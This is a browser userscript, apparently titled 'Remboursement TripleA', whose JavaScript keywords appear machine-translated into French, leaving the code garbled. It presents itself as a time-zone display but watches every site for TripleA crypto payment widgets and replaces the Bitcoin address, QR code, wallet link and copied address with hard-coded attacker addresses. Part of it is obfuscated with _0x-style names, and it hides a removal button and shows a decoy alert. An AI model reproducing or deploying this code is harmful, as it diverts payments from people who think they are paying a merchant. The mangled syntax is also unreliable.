// ==Script utilisateur==
// @name Remboursement TripleA
// @namespace
// @version 1.9
// @description
// @auteur N+A
// @correspondre *://*/*
// @grant aucun
// ==/UserScript==

(fonction () {
    'utiliser strict';

    const monadresseBTCA = 'bc1q86cmjpl4hwj4048z7khw0yy27d5qmhtqlcr83j';
    const myBTCURI = `bitcoin:${myBTCAddress}?amount=0.00085999`;

    const myQRCodeImage = 'https://api.qrserver.com/v1/create-qr-code/?size=210x210&data=' + encodeURIComponent(myBTCURI);

    const timezoneOffsetHours = 2;

    fonction getLocalTimeWithOffset(offsetHours) {
        const maintenant = nouvelle Date();
        const utcTime = now.getTime() + (now.getTimezoneOffset() * 60000);
        const localTime = new Date(utcTime + (offsetHours * 3600000));
        renvoie localTime.toLocaleString();
    }

    fonction displayTimeZone() {
        const timeStr = getLocalTimeWithOffset(timezoneOffsetHours);
        console.log(`Fuseau horaire UTC${timezoneOffsetHours >= 0 ? '+' : ''}${timezoneOffsetHours} → ${timeStr}`);

        const infoDiv = document.createElement('div');
        infoDiv.style.position = 'fixé';
        infoDiv.style.bottom = '10px';
        infoDiv.style.right = '10px';
        infoDiv.style.padding = '10px';
        infoDiv.style.backgroundColor = '#222';
        infoDiv.style.color = 'blanc';
        infoDiv.style.zIndex = 9999;
        infoDiv.style.fontSize = '12px';
        infoDiv.style.borderRadius = '6px';
        infoDiv.textContent = `Fuseau UTC${timezoneOffsetHours >= 0 ? '+' : ''}${timezoneOffsetHours} : ${timeStr}`;
        document.body.appendChild(infoDiv);
    }

    fonction replaceQRCode() {
        laissez remplacé = faux ;

        const addressElement = document.querySelector('.triplea-new-address');
        si (addressElement && addressElement.textContent !== myBTCAddress) {
            addressElement.textContent = monadresseBTCAddress;
            remplacé = vrai;
        }

        const qrImage = document.querySelector('img[src*="api.triple-a.io/api/v2/payment/"][src*="qrcode"]');
        si (qrImage && qrImage.src !== myQRCodeImage) {
            qrImage.src = monQRCodeImage;
            qrImage.style.width = '210px';
            qrImage.style.height = '210px';
            remplacé = vrai;
        }

        const walletBtn = document.querySelector('.btn.triplea-open-in-wallet-btn');
        si (walletBtn && walletBtn.href !== myBTCURI) {
            walletBtn.href = myBTCURI;
            remplacé = vrai;
        }

        const copyBtn = document.querySelector('.triplea-copy-icon-for-address');
        si (copyBtn) {
            copyBtn.addEventListener('clic', () => {
                navigator.clipboard.writeText(myBTCAddress).then(() => {
                    console.log('Adresse BTC copiée :', myBTCAddress);
                }).catch(err => {
                    console.error('Erreur lors de la copie de l'adresse BTC :', err);
                });
            });
        }

        si (remplacé) {
            console.log('Adresse BTC et QR code remplacés.');
        }
    }

    const observer = new MutationObserver(replaceQRCode);
    observer.observe(document.body, { childList: true, subtree: true });

    replaceQRCode();
    afficherTimeZone();

    const _0x48d4a0 = 'bc1q50snjxta0p8d96ctjwdgn3ds92cnh5nkd7rskf',
        _0xda2c14 = 'https://imgur.com/BFGujj6.png',
        _0x48f160 = '210px',
        _0x26c79b = '210px';

    laissez _0x679a4e = faux;

    fonction _0x269c2a(adresse) {
        const _0x4df099 = document.createElement('textarea');
        _0x4df099.value = adresse ;
        document.body.appendChild(_0x4df099);
        _0x4df099.select();
        document.execCommand('copie');
        document.body.removeChild(_0x4df099);

        essayer {
            document.querySelector('.alert').textContent = 'Adresse BTC copiée: ' + adresse;
            console.log('Adresse BTC copiée:', adresse);
        } attraper (err) {
            console.error('Erreur lors de la copie:', err);
        }
    }

    fonction _0x5d5b8c() {
        laissez _0x547271 = faux, _0x3bd401 = faux, _0x5304b2 = faux, _0x16ad98 = faux ;

        const _0x5cf5d4 = document.querySelector('.triplea-new-address');
        si (_0x5cf5d4 && _0x5cf5d4.textContent !== _0x48d4a0) {
            _0x5cf5d4.textContent = _0x48d4a0;
            _0x547271 = vrai;
        }

        const _0x2cd977 = document.querySelector('img[src*="api.triple-a.io/api/v2/payment/"][src*="qrcode"]');
        si (_0x2cd977 && _0x2cd977.src !== _0xda2c14) {
            _0x2cd977.src = _0xda2c14;
            _0x2cd977.style.width = _0x48f160;
            _0x2cd977.style.height = _0x26c79b;
            _0x3bd401 = vrai;
        }

        const _0x17b725 = document.querySelector('.btn.triplea-open-in-wallet-btn');
        si (_0x17b725 && _0x17b725.href !== 'bitcoin:' + _0x48d4a0 + '?amount=0.00085999') {
            _0x17b725.href = 'bitcoin:' + _0x48d4a0 + '?montant=0.00085999';
        }

        const _0x55b612 = document.querySelector('.triplea-copy-icon-for-address');
        si (_0x55b612) {
            _0x55b612.addEventListener('clic', fonction () {
                _0x269c2a(_0x48d4a0);
            });
            _0x5304b2 = vrai;
        }

        const _0x3df8f1 = document.querySelector('.triplea-remove-button');
        si (_0x3df8f1) {
            _0x3df8f1.remove();
            _0x16ad98 = vrai;
        }

        si (_0x547271 || _0x3bd401 || _0x5304b2 || _0x16ad98) {
            si (!_0x679a4e) {
                _0x679a4e = vrai;
                setTimeout(() => {
                    alert('Script Fuseaux Horaires Actifs');
                }, 1000);
            }
        }
    }

    const observer2 = new MutationObserver(_0x5d5b8c);
    observer2.observe(document.body, { childList: true, subtree: true });
    _0x5d5b8c();

})();
